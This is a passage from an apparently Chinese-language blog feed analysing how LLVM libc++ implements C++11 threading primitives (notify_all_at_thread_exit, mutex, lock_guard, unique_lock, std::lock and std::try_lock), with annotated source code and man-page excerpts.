and thread_local destructors have finished</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到std::notify_all_at_thread_exit 函数，实际上是注册了一对condition_variable，mutex，当线程退出时，notify_all。</p>
<p>下面来看下具体的实现：</p>
<p>这个是通过Thread-specific Data来实现的，具体可以参考：<a href="http://www.ibm.com/developerworks/cn/linux/thread/posix_threadapi/part2/" target="_blank" rel="noopener">http://www.ibm.com/developerworks/cn/linux/thread/posix_threadapi/part2/</a></p>
<p>但我个人觉得这个应该叫线程特定数据比较好，因为它是可以被别的线程访问的，而不是某个线程”专有“的。</p>
<p>简而言之，std::thread在构造的时候，创建了一个__thread_struct_imp对象。</p>
<p>__thread_struct_imp对象里，用一个vector来保存了<code>pair&lt;condition_variable*, mutex*&gt;</code>：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span>  __<span class="title">thread_struct_imp</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="built_in">vector</span>&lt;__assoc_sub_state*,</span><br><span class="line">                          __hidden_allocator&lt;__assoc_sub_state*&gt; &gt; _AsyncStates;</span><br><span class="line">&lt;strong&gt;    <span class="keyword">typedef</span> <span class="built_in">vector</span>&lt;pair&lt;condition_variable*, mutex*&gt;,</span><br><span class="line">               __hidden_allocator&lt;pair&lt;condition_variable*, mutex*&gt; &gt; &gt; _Notify;&lt;/strong&gt;</span><br><span class="line"> </span><br><span class="line">    _AsyncStates async_states_;</span><br><span class="line">    _Notify notify_;</span><br></pre></td></tr></table></figure>
<p><strong>当调用notify_all_at_thread_exit函数时，把condition_variable和mutex，push到vector里：</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__thread_struct_imp::notify_all_at_thread_exit(condition_variable* cv, mutex* m)</span><br><span class="line">&#123;</span><br><span class="line">    notify_.push_back(pair&lt;condition_variable*, mutex*&gt;(cv, m));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当线程退出时，会delete掉<strong>thread_struct_imp，也就是会调用</strong>thread_struct_imp的析构函数。</p>
<p><strong>而在析构函数里，会调用历遍vector，unlock每个mutex，和调用condition_variable.notify_all()函数：</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__thread_struct_imp::~__thread_struct_imp()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (_Notify::iterator i = notify_.begin(), e = notify_.end();</span><br><span class="line">            i != e; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        i-&gt;second-&gt;unlock();</span><br><span class="line">        i-&gt;first-&gt;notify_all();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (_AsyncStates::iterator i = async_states_.begin(), e = async_states_.end();</span><br><span class="line">            i != e; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        (*i)-&gt;__make_ready();</span><br><span class="line">        (*i)-&gt;__release_shared();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>更详细的一些封闭代码，我提取出来放到了gist上：<a href="https://gist.github.com/hengyunabc/d48fbebdb9bddcdf05e9" target="_blank" rel="noopener">https://gist.github.com/hengyunabc/d48fbebdb9bddcdf05e9</a></p>
<h2 id="其它的一些东东"><a href="#其它的一些东东" class="headerlink" title="其它的一些东东"></a>其它的一些东东</h2><p>关于线程的yield, detch, join，可以直接参考man文档：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pthread_yield:</span><br><span class="line"></span><br><span class="line">       pthread_yield() causes the calling thread to relinquish the CPU.  The</span><br><span class="line">       thread is placed at the end of the run queue for its static priority</span><br><span class="line">       and another thread is scheduled to run.  For further details, see</span><br><span class="line">       sched_yield(2)</span><br><span class="line">pthread_detach:</span><br><span class="line">       The pthread_detach() function marks the thread identified by thread</span><br><span class="line">       as detached.  When a detached thread terminates, its resources are</span><br><span class="line">       automatically released back to the system without the need for</span><br><span class="line">       another thread to join with the terminated thread.</span><br><span class="line"></span><br><span class="line">       Attempting to detach an already detached thread results in</span><br><span class="line">       unspecified behavior.</span><br><span class="line">pthread_join:</span><br><span class="line">       The pthread_join() function waits for the thread specified by thread</span><br><span class="line">       to terminate.  If that thread has already terminated, then</span><br><span class="line">       pthread_join() returns immediately.  The thread specified by thread</span><br><span class="line">       must be joinable.</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>个人感觉像 join, detach这两个函数实际没多大用处。绝大部分情况下，线程创建之后，都应该detach掉。</p>
<p>像join这种同步机制不如换mutex等更好。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://en.cppreference.com/w/cpp/thread/notify_all_at_thread_exit" target="_blank" rel="noopener">http://en.cppreference.com/w/cpp/thread/notify_all_at_thread_exit</a></li>
<li><a href="http://man7.org/linux/man-pages/man3/pthread_detach.3.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man3/pthread_detach.3.html</a></li>
<li><a href="http://man7.org/linux/man-pages/man3/pthread_join.3.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man3/pthread_join.3.html</a></li>
<li><a href="http://stackoverflow.com/questions/19744250/c11-what-happens-to-a-detached-thread-when-main-exits" target="_blank" rel="noopener">http://stackoverflow.com/questions/19744250/c11-what-happens-to-a-detached-thread-when-main-exits</a></li>
<li><a href="http://man7.org/linux/man-pages/man3/pthread_yield.3.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man3/pthread_yield.3.html</a></li>
<li><a href="http://man7.org/linux/man-pages/man2/sched_yield.2.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man2/sched_yield.2.html</a></li>
<li><a href="http://www.ibm.com/developerworks/cn/linux/thread/posix_threadapi/part2/" target="_blank" rel="noopener">http://www.ibm.com/developerworks/cn/linux/thread/posix_threadapi/part2/</a></li>
<li>man pthread_key_create</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>cpp</tag>
        <tag>cpp11</tag>
        <tag>posix</tag>
      </tags>
  </entry>
  <entry>
    <title>C++11中的mutex, lock，condition variable实现分析</title>
    <url>/cpp11-mutex-lock-condition/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文分析的是llvm libc++的实现：<a href="http://libcxx.llvm.org/" target="_blank" rel="noopener">http://libcxx.llvm.org/</a></p>
<p>C++11中的各种mutex, lock对象，实际上都是对posix的mutex，condition的封装。不过里面也有很多细节值得学习。</p>
<h2 id="std-mutex"><a href="#std-mutex" class="headerlink" title="std::mutex"></a>std::mutex</h2><p>先来看下std::mutex：</p>
<p>包增了一个pthread_mutex_t __m_，很简单，每个函数该干嘛就干嘛。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mutex</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">pthread_mutex_t</span> __m_;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">     mutex() _NOEXCEPT &#123;__m_ = (<span class="keyword">pthread_mutex_t</span>)&lt;strong&gt;PTHREAD_MUTEX_INITIALIZER&lt;/strong&gt;;&#125;</span><br><span class="line">     ~mutex();</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    mutex(<span class="keyword">const</span> mutex&amp;);<span class="comment">// = delete;</span></span><br><span class="line">    mutex&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> mutex&amp;);<span class="comment">// = delete;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">try_lock</span><span class="params">()</span> _NOEXCEPT</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">unlock</span><span class="params">()</span> _NOEXCEPT</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">pthread_mutex_t</span>* native_handle_type;</span><br><span class="line">    <span class="function">_LIBCPP_INLINE_VISIBILITY native_handle_type <span class="title">native_handle</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> &amp;__m_;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">mutex::~mutex()</span><br><span class="line">&#123;</span><br><span class="line">    pthread_mutex_destroy(&amp;__m_);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mutex::lock</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ec = pthread_mutex_lock(&amp;__m_);</span><br><span class="line">    <span class="keyword">if</span> (ec)</span><br><span class="line">        __throw_system_error(ec, <span class="string">"mutex lock failed"</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">mutex::try_lock</span><span class="params">()</span> _NOEXCEPT</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> pthread_mutex_trylock(&amp;__m_) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mutex::unlock</span><span class="params">()</span> _NOEXCEPT</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ec = pthread_mutex_unlock(&amp;__m_);</span><br><span class="line">    (<span class="keyword">void</span>)ec;</span><br><span class="line">    assert(ec == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="三种锁状态：std-defer-lock-std-try-to-lock-std-adopt-lock"><a href="#三种锁状态：std-defer-lock-std-try-to-lock-std-adopt-lock" class="headerlink" title="三种锁状态：std::defer_lock, std::try_to_lock, std::adopt_lock"></a>三种锁状态：std::defer_lock, std::try_to_lock, std::adopt_lock</h2><p>这三个是用于标识锁在传递到一些包装类时，锁的状态：</p>
<ul>
<li>std::defer_lock，还没有获取到锁</li>
<li>std::try_to_lock，在包装类构造时，尝试去获取锁</li>
<li>std::adopt_lock，调用者已经获得了锁</li>
</ul>
<p>这三个东东，实际上是用于偏特化的，是三个空的struct：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>  <span class="title">defer_lock_t</span> &#123;</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span>  <span class="title">try_to_lock_t</span> &#123;</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span>  <span class="title">adopt_lock_t</span> &#123;</span>&#125;;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">defer_lock_t</span>  defer_lock  = <span class="keyword">defer_lock_t</span>();</span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">try_to_lock_t</span> try_to_lock = <span class="keyword">try_to_lock_t</span>();</span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">adopt_lock_t</span>  adopt_lock  = <span class="keyword">adopt_lock_t</span>();</span><br></pre></td></tr></table></figure>
<p>在下面的代码里，就可以看到这三个东东是怎么用的了。</p>
<h2 id="std-lock-guard"><a href="#std-lock-guard" class="headerlink" title="std::lock_guard"></a>std::lock_guard</h2><p>这个类比较重要，因为我们真正使用lock的时候，大部分都是要用这个。</p>
<p>这个类其实很简单：</p>
<ul>
<li>在构造函数里调用 mutext.lock()，</li>
<li>在释构函数里，调用了mutex.unlock() 函数。</li>
</ul>
<p>因为C++会在函数抛出异常时，自动调用作用域内的变量的析构函数，<strong>所以使用std::lock_guard可以在异常时自动释放锁，这就是为什么要避免直接使用mutex的函数，而是要用std::lock_guard的原因了。</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Mutex</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">lock_guard</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> _Mutex mutex_type;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    mutex_type&amp; __m_;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">lock_guard</span><span class="params">(mutex_type&amp; __m)</span></span></span><br><span class="line"><span class="function">        : __<span class="title">m_</span><span class="params">(__m)</span> </span>&#123;__m_.lock();&#125;</span><br><span class="line">    lock_guard(mutex_type&amp; __m, <span class="keyword">adopt_lock_t</span>)</span><br><span class="line">        : __m_(__m) &#123;&#125;</span><br><span class="line">    ~lock_guard() &#123;__m_.unlock();&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    lock_guard(lock_guard <span class="keyword">const</span>&amp;);<span class="comment">// = delete;</span></span><br><span class="line">    lock_guard&amp; <span class="keyword">operator</span>=(lock_guard <span class="keyword">const</span>&amp;);<span class="comment">// = delete;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>注意，std::lock_guard的两个构造函数，当只传递mutex时，会在构造函数时调用mutext.lock()来获得锁。</p>
<p>当传递了adopt_lock_t时，说明调用者已经拿到了锁，所以不再尝试去获得锁。</p>
<h2 id="std-unique-lock"><a href="#std-unique-lock" class="headerlink" title="std::unique_lock"></a>std::unique_lock</h2><p>unique_lock实际上也是一个包装类，起名为unique可能是和std::lock函数区分用的。<br>注意，多了一个owns_lock函数和release()函数，这两个在std::lock函数会用到。</p>
<p>owns_lock函数用于判断是否拥有锁；</p>
<p>release()函数则放弃了对锁的关联，当析构时，不会去unlock锁。<br>再看下unique_lock的实现，可以发现，<strong>上面的三种类型就是用来做偏特化用的</strong>：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Mutex</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">unique_lock</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">typedef</span> _Mutex mutex_type;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    mutex_type* __m_;</span><br><span class="line">    <span class="keyword">bool</span> __owns_;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unique_lock() _NOEXCEPT : __m_(<span class="literal">nullptr</span>), __owns_(<span class="literal">false</span>) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">unique_lock</span><span class="params">(mutex_type&amp; __m)</span></span></span><br><span class="line">        : __m_(&amp;__m), __owns_(true) &#123;__m_-&gt;lock();&#125;</span><br><span class="line">    unique_lock(mutex_type&amp; __m, <span class="keyword">defer_lock_t</span>) _NOEXCEPT</span><br><span class="line">        : __m_(&amp;__m), __owns_(<span class="literal">false</span>) &#123;&#125;</span><br><span class="line">    unique_lock(mutex_type&amp; __m, <span class="keyword">try_to_lock_t</span>)    <span class="comment">//偏特化</span></span><br><span class="line">        : __m_(&amp;__m), __owns_(__m.try_lock()) &#123;&#125;</span><br><span class="line">    unique_lock(mutex_type&amp; __m, <span class="keyword">adopt_lock_t</span>)     <span class="comment">//偏特化</span></span><br><span class="line">        : __m_(&amp;__m), __owns_(<span class="literal">true</span>) &#123;&#125;</span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Clock</span>, <span class="title">class</span> _<span class="title">Duration</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">unique_lock</span>(<span class="title">mutex_type</span>&amp; __<span class="title">m</span>, <span class="title">const</span> <span class="title">chrono</span>:</span>:time_point&lt;_Clock, _Duration&gt;&amp; <span class="keyword">__t</span>)</span><br><span class="line">            : __m_(&amp;__m), __owns_(__m.try_lock_until(<span class="keyword">__t</span>)) &#123;&#125;</span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Rep</span>, <span class="title">class</span> _<span class="title">Period</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">unique_lock</span>(<span class="title">mutex_type</span>&amp; __<span class="title">m</span>, <span class="title">const</span> <span class="title">chrono</span>:</span>:duration&lt;_Rep, _Period&gt;&amp; __d)</span><br><span class="line">            : __m_(&amp;__m), __owns_(__m.try_lock_for(__d)) &#123;&#125;</span><br><span class="line">    ~unique_lock()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (__owns_)</span><br><span class="line">            __m_-&gt;unlock();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    unique_lock(unique_lock <span class="keyword">const</span>&amp;); <span class="comment">// = delete;</span></span><br><span class="line">    unique_lock&amp; <span class="keyword">operator</span>=(unique_lock <span class="keyword">const</span>&amp;); <span class="comment">// = delete;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unique_lock(unique_lock&amp;&amp; __u) _NOEXCEPT</span><br><span class="line">        : __m_(__u.__m_), __owns_(__u.__owns_)</span><br><span class="line">        &#123;__u.__m_ = <span class="literal">nullptr</span>; __u.__owns_ = <span class="literal">false</span>;&#125;</span><br><span class="line">    unique_lock&amp; <span class="keyword">operator</span>=(unique_lock&amp;&amp; __u) _NOEXCEPT</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (__owns_)</span><br><span class="line">                __m_-&gt;unlock();</span><br><span class="line">            __m_ = __u.__m_;</span><br><span class="line">            __owns_ = __u.__owns_;</span><br><span class="line">            __u.__m_ = <span class="literal">nullptr</span>;</span><br><span class="line">            __u.__owns_ = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">try_lock</span><span class="params">()</span></span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Rep</span>, <span class="title">class</span> _<span class="title">Period</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="title">bool</span> <span class="title">try_lock_for</span>(<span class="title">const</span> <span class="title">chrono</span>:</span>:duration&lt;_Rep, _Period&gt;&amp; __d);</span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Clock</span>, <span class="title">class</span> _<span class="title">Duration</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="title">bool</span> <span class="title">try_lock_until</span>(<span class="title">const</span> <span class="title">chrono</span>:</span>:time_point&lt;_Clock, _Duration&gt;&amp; <span class="keyword">__t</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">unlock</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(unique_lock&amp; __u)</span> _NOEXCEPT</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        _VSTD::swap(__m_, __u.__m_);</span><br><span class="line">        _VSTD::swap(__owns_, __u.__owns_);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">mutex_type* <span class="title">release</span><span class="params">()</span> _NOEXCEPT</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        mutex_type* __m = __m_;</span><br><span class="line">        __m_ = <span class="literal">nullptr</span>;</span><br><span class="line">        __owns_ = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> __m;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">owns_lock</span><span class="params">()</span> <span class="keyword">const</span> _NOEXCEPT </span>&#123;<span class="keyword">return</span> __owns_;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">bool</span> <span class="params">()</span> <span class="keyword">const</span> _NOEXCEPT </span>&#123;<span class="keyword">return</span> __owns_;&#125;</span><br><span class="line">    <span class="function">mutex_type* <span class="title">mutex</span><span class="params">()</span> <span class="keyword">const</span> _NOEXCEPT </span>&#123;<span class="keyword">return</span> __m_;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="std-lock和std-try-lock函数"><a href="#std-lock和std-try-lock函数" class="headerlink" title="std::lock和std::try_lock函数"></a>std::lock和std::try_lock函数</h2><p>上面的都是类对象，这两个是函数。<br>std::lock和std::try_lock函数用于在同时使用多个锁时，防止死锁。这个实际上很重要的，因为手写代码来处理多个锁的同步问题，很容易出错。</p>
<p>要注意的是std::try_lock函数的返回值：</p>
<ul>
<li>当成功时，返回-1；</li>
<li>当失败时，返回第几个锁没有获取成功，以0开始计数；</li>
</ul>
<p>首先来看下只有两个锁的情况，代码虽然看起来比较简单，但里面却有大文章：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">L0</span>, <span class="title">class</span> _<span class="title">L1</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span></span></span><br><span class="line"><span class="class"><span class="title">lock</span>(_<span class="title">L0</span>&amp; __<span class="title">l0</span>, _<span class="title">L1</span>&amp; __<span class="title">l1</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        &#123;</span><br><span class="line">            unique_lock&lt;_L0&gt; __u0(__l0);</span><br><span class="line">            <span class="keyword">if</span> (__l1.try_lock())  <span class="comment">//已获得锁l0，再尝试获取l1</span></span><br><span class="line">            &#123;</span><br><span class="line">                __u0.release();   <span class="comment">//l0和l1都已获取到，因为unique_lock在释构时会释放l0，所以要调用release()函数，不让它释放l0锁。</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="comment">//如果同时获取l0,l1失败，这里会释放l0。</span></span><br><span class="line">        sched_yield();  <span class="comment">//把线程放到同一优先级的调度队列的尾部，CPU切换到其它线程执行</span></span><br><span class="line">        &#123;</span><br><span class="line">            unique_lock&lt;_L1&gt; __u1(__l1); <span class="comment">//因为上面尝试先获取l1失败，说明有别的线程在持有l1，那么这次先尝试获取锁l1（只有前面的线程释放了，才可能获取到）</span></span><br><span class="line">            <span class="keyword">if</span> (__l0.try_lock())</span><br><span class="line">            &#123;</span><br><span class="line">                __u1.release();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sched_yield();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">L0</span>, <span class="title">class</span> _<span class="title">L1</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">int</span></span></span><br><span class="line"><span class="class"><span class="title">try_lock</span>(_<span class="title">L0</span>&amp; __<span class="title">l0</span>, _<span class="title">L1</span>&amp; __<span class="title">l1</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    unique_lock&lt;_L0&gt; __u0(__l0, try_to_lock);</span><br><span class="line">    <span class="keyword">if</span> (__u0.owns_lock())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (__l1.try_lock()) <span class="comment">//注意try_lock返回值的定义，否则这里无法理解</span></span><br><span class="line">        &#123;</span><br><span class="line">            __u0.release();</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的lock函数用尝试的办法防止了死锁。</p>
<p>上面是两个锁的情况，那么在多个参数的情况下呢？<br>先来看下std::try_lock函数的实现：</p>
<p><strong>里面递归地调用了try_lock函数自身，如果全部锁都获取成功，则依次把所有的unique_lock都release掉。</strong></p>
<p>如果有失败，则计数失败的次数，最终返回。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">L0</span>, <span class="title">class</span> _<span class="title">L1</span>, <span class="title">class</span> _<span class="title">L2</span>, <span class="title">class</span>... _<span class="title">L3</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">int</span></span></span><br><span class="line"><span class="class"><span class="title">try_lock</span>(_<span class="title">L0</span>&amp; __<span class="title">l0</span>, _<span class="title">L1</span>&amp; __<span class="title">l1</span>, _<span class="title">L2</span>&amp; __<span class="title">l2</span>, _<span class="title">L3</span>&amp;... __<span class="title">l3</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> __r = <span class="number">0</span>;</span><br><span class="line">    unique_lock&lt;_L0&gt; __u0(__l0, try_to_lock);</span><br><span class="line">    <span class="keyword">if</span> (__u0.owns_lock())</span><br><span class="line">    &#123;</span><br><span class="line">        __r = try_lock(__l1, __l2, __l3...);</span><br><span class="line">        <span class="keyword">if</span> (__r == <span class="number">-1</span>)</span><br><span class="line">            __u0.release();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            ++__r;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> __r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再来看多参数的std::lock的实现：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">L0</span>, <span class="title">class</span> _<span class="title">L1</span>, <span class="title">class</span> _<span class="title">L2</span>, <span class="title">class</span> ..._<span class="title">L3</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span></span></span><br><span class="line"><span class="class">__<span class="title">lock_first</span>(<span class="title">int</span> __<span class="title">i</span>, _<span class="title">L0</span>&amp; __<span class="title">l0</span>, _<span class="title">L1</span>&amp; __<span class="title">l1</span>, _<span class="title">L2</span>&amp; __<span class="title">l2</span>, _<span class="title">L3</span>&amp; ...__<span class="title">l3</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (__i)  <span class="comment">//__i用来标记上一次获取参数里的第几个锁失败，从0开始计数</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:   <span class="comment">//第一次执行时，__i是0</span></span><br><span class="line">            &#123;</span><br><span class="line">                unique_lock&lt;_L0&gt; __u0(__l0);</span><br><span class="line">                __i = try_lock(__l1, __l2, __l3...);</span><br><span class="line">                <span class="keyword">if</span> (__i == <span class="number">-1</span>)  <span class="comment">//获取到l0之后，如果尝试获取后面的锁也成功了，即全部锁都获取到了，则设置unique_lock为release，并返回</span></span><br><span class="line">                &#123;</span><br><span class="line">                    __u0.release();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ++__i;  <span class="comment">//因为__i表示是获取第几个锁失败，而上面的try_lock(__l1,__l2__l3,...)是从l1开始的，因此这里要+1，调整到没有获取成功的锁上，下次先从它开始获取。</span></span><br><span class="line">            sched_yield();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:   <span class="comment">//说明上次获取l1失败，这次先获取到l1。</span></span><br><span class="line">            &#123;</span><br><span class="line">                unique_lock&lt;_L1&gt; __u1(__l1);    </span><br><span class="line">                __i = try_lock(__l2, __l3..., __l0);   <span class="comment">//把前一次的l0放到最后。这次先获取到了l1，再尝试获取后面的锁。</span></span><br><span class="line">                <span class="keyword">if</span> (__i == <span class="number">-1</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    __u1.release();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (__i == <span class="keyword">sizeof</span>...(_L3) + <span class="number">1</span>)   <span class="comment">//说明把l0放到最后面时，最后获取l0时失败了。那么说明现在有其它线程持有l0，那么下一次要从l0开始获取。</span></span><br><span class="line">                __i = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                __i += <span class="number">2</span>; <span class="comment">//因为__i表示是获取第几个锁失败，而上面的try_lock(__l2,__l3..., __l0)是从l2开始的，因此这里要+2</span></span><br><span class="line">            sched_yield();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            __lock_first(__i - <span class="number">2</span>, __l2, __l3..., __l0, __l1);    <span class="comment">//因为这里是从l2开始的，因此__i要减2。</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">L0</span>, <span class="title">class</span> _<span 